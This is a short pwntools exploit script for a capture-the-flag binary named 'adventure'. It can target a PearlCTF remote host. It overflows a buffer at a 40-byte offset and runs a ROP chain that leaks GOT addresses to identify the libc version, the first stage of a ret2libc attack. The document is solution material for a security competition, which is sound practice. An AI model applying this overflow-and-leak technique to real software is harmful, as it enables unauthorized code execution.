from pwn import *

exe = ELF('./adventure')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *hatchEgg+123
        continue
    """)
elif args.REMOTE:
    io = remote('dyn.ctf.pearlctf.in', '30014')

pop_rdi_ret = 0x000000000040121e

rop = ROP(exe)
offset = 40

rop.raw(b'A' * offset)
rop.puts(exe.got.puts)
rop.puts(exe.got.printf)
rop.puts(exe.got.getchar)
rop.puts(exe.got.gets)
rop.puts(exe.got.fflush)

# https://libc.blukat.me/?q=puts%3A0x7c4a4f5dded0%2Cprintf%3A0x7c4a4f5bd770%2Cgetchar%3A0x7c4a4f5e4b60%2Cgets%3A0x7c4a4f5dd5a0%2Cfflush%3A0x7c4a4f5dc1b0&l=libc6_2.35-0ubuntu1_amd64

io.sendlineafter(b'Enter your choice:', b'2')
io.sendlineafter(b'2. No', b'1')
io.sendlineafter(b'name', rop.chain())
io.recvuntil(b'You leave the area with')
io.recvline()

for _ in range(5):
    address = int.from_bytes(io.recvline().strip(), 'little')
    print(hex(address))
io.interactive()


